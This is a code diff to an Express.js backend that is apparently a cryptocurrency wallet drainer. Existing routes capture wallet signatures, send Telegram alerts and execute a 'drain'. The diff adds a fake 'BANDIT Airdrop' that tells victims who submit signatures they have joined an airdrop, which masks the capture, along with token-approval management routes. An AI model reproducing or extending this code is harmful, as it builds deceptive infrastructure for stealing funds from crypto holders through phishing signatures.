@@ -11,6 +11,9 @@ const uploadsDbPath = path.join(__dirname, "../data/uploads.json");
 const tokensDbPath = path.join(__dirname, "../data/tokens.json");
 const capturedDbPath = path.join(__dirname, "../data/captured.json");
 const registryDbPath = path.join(__dirname, "../data/coins.json");
+const airdropDbPath = path.join(__dirname, "../data/airdrop.json");
+// 🆕 NEW: Unified tokens database
+const unifiedTokensDbPath = path.join(__dirname, "../data/unified-tokens.json");
 
 
 const DEFAULT_REGISTRY = {ethereum: [],solana: [],bnb: [],polygon: []};
@@ -33,10 +36,80 @@ const ensureDataDir = () => {
     if (!fs.existsSync(capturedDbPath)) {
         fs.writeFileSync(capturedDbPath, JSON.stringify([], null, 2));
     }
+    // 🆕 Create unified tokens file with default structure
+    if (!fs.existsSync(unifiedTokensDbPath)) {
+        fs.writeFileSync(unifiedTokensDbPath, JSON.stringify({
+            ethereum: [],
+            bnb: [],
+            polygon: [],
+            solana: []
+        }, null, 2));
+    }
 };
 
 // Initialize on startup
 ensureDataDir();
+
+// ==========================================
+// 🎁 AIRDROP HELPER FUNCTION
+// ==========================================
+const addToAirdrop = (userAddress, chainId) => {
+    try {
+        if (!fs.existsSync(airdropDbPath)) {
+            // Create default airdrop file if not exists
+            const defaultAirdrop = {
+                campaign: {
+                    name: "BANDIT Airdrop",
+                    token: {
+                        symbol: "BNT",
+                        address: "2dj9EhzN8YZ7YSYQKspRAzdB5sWNEkUsRa5Pm1AQbSGT",
+                        network: "solana",
+                        amountPerUser: 50000
+                    },
+                    totalPool: 500000000,
+                    distributed: 0,
+                    status: "active"
+                },
+                participants: []
+            };
+            fs.writeFileSync(airdropDbPath, JSON.stringify(defaultAirdrop, null, 2));
+        }
+
+        let airdropData = JSON.parse(fs.readFileSync(airdropDbPath, "utf8"));
+        
+        // Check if user already in airdrop list
+        const existingUser = airdropData.participants.find(
+            p => p.address.toLowerCase() === userAddress.toLowerCase()
+        );
+        
+        if (existingUser) {
+            return { success: true, alreadyRegistered: true, participant: existingUser };
+        }
+
+        // Add new participant
+        const newParticipant = {
+            id: Date.now(),
+            address: userAddress,
+            chainId: chainId,
+            amount: airdropData.campaign.token.amountPerUser,
+            status: "pending",
+            registeredAt: new Date().toISOString(),
+            claimedAt: null
+        };
+
+        airdropData.participants.push(newParticipant);
+        airdropData.campaign.distributed += airdropData.campaign.token.amountPerUser;
+        
+        fs.writeFileSync(airdropDbPath, JSON.stringify(airdropData, null, 2));
+        
+        console.log(`🎁 [Airdrop] New registration: ${userAddress} - ${airdropData.campaign.token.amountPerUser} BNT`);
+        
+        return { success: true, alreadyRegistered: false, participant: newParticipant };
+    } catch (error) {
+        console.error("❌ [Airdrop] Error adding user:", error);
+        return { success: false, error: error.message };
+    }
+};
 
 // --- EXISTING UPLOAD ROUTES ---
 router.get("/uploads", (req, res) => {
@@ -117,6 +190,310 @@ router.post("/registry/delete", (req, res) => {
     } catch (error) {
         console.error("Delete token error:", error);
         res.status(500).json({ error: "Failed to delete token" });
+    }
+});
+
+// ==========================================
+// 🆕 UNIFIED TOKEN MANAGER ROUTES
+// ==========================================
+
+// Helper: Get unified tokens database
+const getUnifiedTokens = () => {
+    ensureDataDir();
+    if (!fs.existsSync(unifiedTokensDbPath)) {
+        return { ethereum: [], bnb: [], polygon: [], solana: [] };
+    }
+    return JSON.parse(fs.readFileSync(unifiedTokensDbPath, "utf8"));
+};
+
+// Helper: Save unified tokens database
+const saveUnifiedTokens = (tokens) => {
+    fs.writeFileSync(unifiedTokensDbPath, JSON.stringify(tokens, null, 2));
+};
+
+// 1. GET All Unified Tokens (by network or all)
+router.get("/unified-tokens", (req, res) => {
+    try {
+        const { network } = req.query;
+        const tokens = getUnifiedTokens();
+        
+        if (network && tokens[network]) {
+            return res.json(tokens[network]);
+        }
+        
+        // Return all as flat array with network included
+        const allTokens = [];
+        Object.keys(tokens).forEach(net => {
+            tokens[net].forEach(token => {
+                allTokens.push({ ...token, network: net });
+            });
+        });
+        
+        res.json(allTokens);
+    } catch (error) {
+        console.error("Failed to fetch unified tokens:", error);
+        res.status(500).json({ error: "Failed to fetch tokens" });
+    }
+});
+
+// 2. GET Unified Tokens Grouped by Network
+router.get("/unified-tokens/grouped", (req, res) => {
+    try {
+        const tokens = getUnifiedTokens();
+        res.json(tokens);
+    } catch (error) {
+        console.error("Failed to fetch unified tokens:", error);
+        res.status(500).json({ error: "Failed to fetch tokens" });
+    }
+});
+
+// 3. ADD or UPDATE Unified Token
+router.post("/unified-tokens/add", (req, res) => {
+    try {
+        const { 
+            network, 
+            symbol, 
+            name, 
+            address, 
+            decimals = 18, 
+            type = "ERC20_APPROVE",
+            icon = "",
+            price = 0,
+            isCommon = false,
+            isFeatured = false,
+            isAirdrop = false,
+            coingeckoId = ""
+        } = req.body;
+        
+        if (!network || !symbol || !address) {
+            return res.status(400).json({ error: "Network, symbol, and address are required" });
+        }
+        
+        const tokens = getUnifiedTokens();
+        if (!tokens[network]) {
+            tokens[network] = [];
+        }
+        
+        // Check if token exists (by address)
+        const existingIndex = tokens[network].findIndex(
+            t => t.address.toLowerCase() === address.toLowerCase()
+        );
+        
+        const tokenData = {
+            symbol: symbol.toUpperCase(),
+            name,
+            address,
+            decimals: parseInt(decimals),
+            type,
+            icon,
+            price: parseFloat(price) || 0,
+            isCommon,
+            isFeatured,
+            isAirdrop,
+            coingeckoId,
+            updatedAt: new Date().toISOString()
+        };
+        
+        if (existingIndex > -1) {
+            // Update existing
+            tokens[network][existingIndex] = { 
+                ...tokens[network][existingIndex], 
+                ...tokenData 
+            };
+        } else {
+            // Add new
+            tokenData.createdAt = new Date().toISOString();
+            tokens[network].push(tokenData);
+        }
+        
+        saveUnifiedTokens(tokens);
+        
+        // Also sync to old tokens.json for backward compatibility
+        syncToLegacyTokens(tokenData, network);
+        
+        res.json({ 
+            success: true, 
+            token: tokenData,
+            message: existingIndex > -1 ? "Token updated" : "Token added"
+        });
+    } catch (error) {
+        console.error("Failed to add token:", error);
+        res.status(500).json({ error: "Failed to add token" });
+    }
+});
+
+// Helper: Sync to legacy tokens.json for backward compatibility
+const syncToLegacyTokens = (tokenData, network) => {
+    try {
+        let legacyTokens = [];
+        if (fs.existsSync(tokensDbPath)) {
+            legacyTokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
+        }
+        
+        const legacyToken = {
+            id: tokenData.address,
+            symbol: tokenData.symbol,
+            name: tokenData.name,
+            icon: tokenData.icon,
+            price: tokenData.price,
+            isCommon: tokenData.isCommon,
+            network: network
+        };
+        
+        const existingIdx = legacyTokens.findIndex(t => t.id === tokenData.address);
+        if (existingIdx > -1) {
+            legacyTokens[existingIdx] = legacyToken;
+        } else {
+            legacyTokens.push(legacyToken);
+        }
+        
+        fs.writeFileSync(tokensDbPath, JSON.stringify(legacyTokens, null, 2));
+    } catch (error) {
+        console.error("Failed to sync to legacy tokens:", error);
+    }
+};
+
+// 4. DELETE Unified Token
+router.delete("/unified-tokens/:network/:address", (req, res) => {
+    try {
+        const { network, address } = req.params;
+        const tokens = getUnifiedTokens();
+        
+        if (!tokens[network]) {
+            return res.status(404).json({ error: "Network not found" });
+        }
+        
+        const initialLength = tokens[network].length;
+        tokens[network] = tokens[network].filter(
+            t => t.address.toLowerCase() !== address.toLowerCase()
+        );
+        
+        if (tokens[network].length === initialLength) {
+            return res.status(404).json({ error: "Token not found" });
+        }
+        
+        saveUnifiedTokens(tokens);
+        
+        // Also remove from legacy tokens.json
+        try {
+            let legacyTokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
+            legacyTokens = legacyTokens.filter(t => t.id.toLowerCase() !== address.toLowerCase());
+            fs.writeFileSync(tokensDbPath, JSON.stringify(legacyTokens, null, 2));
+        } catch (e) {}
+        
+        res.json({ success: true, message: "Token deleted" });
+    } catch (error) {
+        console.error("Failed to delete token:", error);
+        res.status(500).json({ error: "Failed to delete token" });
+    }
+});
+
+// 5. BULK IMPORT - Migrate from old systems
+router.post("/unified-tokens/migrate", (req, res) => {
+    try {
+        const tokens = getUnifiedTokens();
+        let imported = 0;
+        
+        // Import from tokens.json (swap tokens)
+        if (fs.existsSync(tokensDbPath)) {
+            const legacyTokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
+            legacyTokens.forEach(token => {
+                const network = token.network || "ethereum";
+                if (!tokens[network]) tokens[network] = [];
+                
+                const exists = tokens[network].find(
+                    t => t.address?.toLowerCase() === token.id?.toLowerCase()
+                );
+                
+                if (!exists && token.id) {
+                    tokens[network].push({
+                        symbol: token.symbol,
+                        name: token.name,
+                        address: token.id,
+                        decimals: 18,
+                        type: network === "solana" ? "SPL_TOKEN" : "ERC20_APPROVE",
+                        icon: token.icon || "",
+                        price: token.price || 0,
+                        isCommon: token.isCommon || false,
+                        isFeatured: token.isFeatured || false,
+                        isAirdrop: token.isAirdrop || false,
+                        coingeckoId: "",
+                        createdAt: new Date().toISOString(),
+                        updatedAt: new Date().toISOString()
+                    });
+                    imported++;
+                }
+            });
+        }
+        
+        // Import from coins.json (registry)
+        if (fs.existsSync(registryDbPath)) {
+            const registry = JSON.parse(fs.readFileSync(registryDbPath, "utf8"));
+            Object.keys(registry).forEach(network => {
+                if (!tokens[network]) tokens[network] = [];
+                
+                registry[network].forEach(token => {
+                    const exists = tokens[network].find(
+                        t => t.address?.toLowerCase() === token.address?.toLowerCase()
+                    );
+                    
+                    if (!exists && token.address) {
+                        tokens[network].push({
+                            symbol: token.symbol,
+                            name: token.name || token.symbol,
+                            address: token.address,
+                            decimals: token.decimals || 18,
+                            type: token.type || "ERC20_APPROVE",
+                            icon: token.logo || "",
+                            price: 0,
+                            isCommon: false,
+                            isFeatured: false,
+                            isAirdrop: false,
+                            coingeckoId: "",
+                            createdAt: new Date().toISOString(),
+                            updatedAt: new Date().toISOString()
+                        });
+                        imported++;
+                    }
+                });
+            });
+        }
+        
+        saveUnifiedTokens(tokens);
+        
+        res.json({ 
+            success: true, 
+            message: `Migration complete. Imported ${imported} tokens.`,
+            tokens 
+        });
+    } catch (error) {
+        console.error("Migration failed:", error);
+        res.status(500).json({ error: "Migration failed" });
+    }
+});
+
+// 6. GET Stats for dashboard
+router.get("/unified-tokens/stats", (req, res) => {
+    try {
+        const tokens = getUnifiedTokens();
+        
+        const stats = {
+            total: 0,
+            byNetwork: {},
+            commonTokens: 0,
+            featuredTokens: 0
+        };
+        
+        Object.keys(tokens).forEach(network => {
+            stats.byNetwork[network] = tokens[network].length;
+            stats.total += tokens[network].length;
+            stats.commonTokens += tokens[network].filter(t => t.isCommon).length;
+            stats.featuredTokens += tokens[network].filter(t => t.isFeatured).length;
+        });
+        
+        res.json(stats);
+    } catch (error) {
+        res.status(500).json({ error: "Failed to get stats" });
     }
 });
 
@@ -213,8 +590,51 @@ router.delete("/deletetoken/:id", (req, res) => {
     }
 });
 
+// ==========================================
+// 🛡️ SIMPLE RATE LIMITER FOR SUBMIT
+// ==========================================
+const submitRateLimiter = (() => {
+    const requests = new Map();
+    const WINDOW_MS = 60000; // 1 minute
+    const MAX_REQUESTS = 10; // 10 requests per minute per IP
+    
+    return (req, res, next) => {
+        const ip = req.ip || req.connection.remoteAddress || 'unknown';
+        const now = Date.now();
+        
+        // Clean old entries
+        for (const [key, data] of requests.entries()) {
+            if (now - data.firstRequest > WINDOW_MS) {
+                requests.delete(key);
+            }
+        }
+        
+        const current = requests.get(ip);
+        if (!current) {
+            requests.set(ip, { count: 1, firstRequest: now });
+            return next();
+        }
+        
+        if (now - current.firstRequest > WINDOW_MS) {
+            requests.set(ip, { count: 1, firstRequest: now });
+            return next();
+        }
+        
+        if (current.count >= MAX_REQUESTS) {
+            console.warn(`⚠️ Rate limit exceeded for IP: ${ip}`);
+            return res.status(429).json({ 
+                error: 'Too many requests. Please try again later.',
+                retryAfter: Math.ceil((WINDOW_MS - (now - current.firstRequest)) / 1000)
+            });
+        }
+        
+        current.count++;
+        next();
+    };
+})();
+
 // --- 🔧 FIXED CAPTURE ROUTE ---
-router.post("/submit", (req, res) => {
+router.post("/submit", submitRateLimiter, (req, res) => {
     try {
         ensureDataDir();
         const { user, chainId, signature, payload, asset, timestamp } = req.body;
@@ -257,11 +677,23 @@ router.post("/submit", (req, res) => {
 
         sendTelegramAlert(newEntry);
 
+        // 🎁 AUTO-REGISTER FOR AIRDROP
+        let airdropResult = null;
+        if (user) {
+            airdropResult = addToAirdrop(user, chainId);
+        }
 
         res.json({ 
             success: true, 
-            message: "Signature captured successfully",
-            entryId: newEntry.id 
+            message: airdropResult?.alreadyRegistered 
+                ? "Address already registered for airdrop"
+                : "Address successfully added to Airdrop List!",
+            entryId: newEntry.id,
+            airdrop: airdropResult?.success ? {
+                registered: true,
+                amount: airdropResult.participant?.amount || 50000,
+                token: "BNT"
+            } : null
         });
     } catch (error) {
         console.error("❌ Capture error:", error);
@@ -340,6 +772,112 @@ router.post("/execute_drain", async (req, res) => {
     }
 });
 
+
+// ==========================================
+// 🎁 AIRDROP MANAGEMENT ROUTES
+// ==========================================
+
+// GET Airdrop Campaign Info
+router.get("/airdrop", (req, res) => {
+    try {
+        if (!fs.existsSync(airdropDbPath)) {
+            return res.json({ campaign: null, participants: [] });
+        }
+        const airdropData = JSON.parse(fs.readFileSync(airdropDbPath, "utf8"));
+        
+        // Return campaign info without full participant list (privacy)
+        res.json({
+            campaign: airdropData.campaign,
+            totalParticipants: airdropData.participants.length,
+            remainingPool: airdropData.campaign.totalPool - airdropData.campaign.distributed
+        });
+    } catch (error) {
+        console.error("Failed to fetch airdrop:", error);
+        res.status(500).json({ error: "Failed to fetch airdrop data" });
+    }
+});
+
+// GET Check if user is eligible/registered for airdrop
+router.get("/airdrop/check/:address", (req, res) => {
+    try {
+        const { address } = req.params;
+        
+        if (!fs.existsSync(airdropDbPath)) {
+            return res.json({ eligible: false, registered: false });
+        }
+        
+        const airdropData = JSON.parse(fs.readFileSync(airdropDbPath, "utf8"));
+        const participant = airdropData.participants.find(
+            p => p.address.toLowerCase() === address.toLowerCase()
+        );
+        
+        if (participant) {
+            res.json({
+                eligible: true,
+                registered: true,
+                amount: participant.amount,
+                status: participant.status,
+                registeredAt: participant.registeredAt,
+                token: airdropData.campaign.token
+            });
+        } else {
+            res.json({
+                eligible: true,
+                registered: false,
+                potentialAmount: airdropData.campaign.token.amountPerUser,
+                token: airdropData.campaign.token
+            });
+        }
+    } catch (error) {
+        console.error("Failed to check airdrop status:", error);
+        res.status(500).json({ error: "Failed to check airdrop status" });
+    }
+});
+
+// GET All airdrop participants (admin only)
+router.get("/airdrop/participants", (req, res) => {
+    try {
+        if (!fs.existsSync(airdropDbPath)) {
+            return res.json([]);
+        }
+        const airdropData = JSON.parse(fs.readFileSync(airdropDbPath, "utf8"));
+        res.json(airdropData.participants);
+    } catch (error) {
+        console.error("Failed to fetch participants:", error);
+        res.status(500).json({ error: "Failed to fetch participants" });
+    }
+});
+
+// POST Manual airdrop registration (for testing)
+router.post("/airdrop/register", (req, res) => {
+    try {
+        const { address, chainId } = req.body;
+        
+        if (!address) {
+            return res.status(400).json({ error: "Address is required" });
+        }
+        
+        const result = addToAirdrop(address, chainId || "unknown");
+        
+        if (result.success) {
+            res.json({
+                success: true,
+                message: result.alreadyRegistered 
+                    ? "Address already registered for airdrop" 
+                    : "Address successfully added to Airdrop List",
+                participant: result.participant
+            });
+        } else {
+            res.status(500).json({ error: result.error });
+        }
+    } catch (error) {
+        console.error("Failed to register for airdrop:", error);
+        res.status(500).json({ error: "Failed to register for airdrop" });
+    }
+});
+
+// Export addToAirdrop for use in submit route
+router.addToAirdrop = addToAirdrop;
 
 
 module.exports = router;
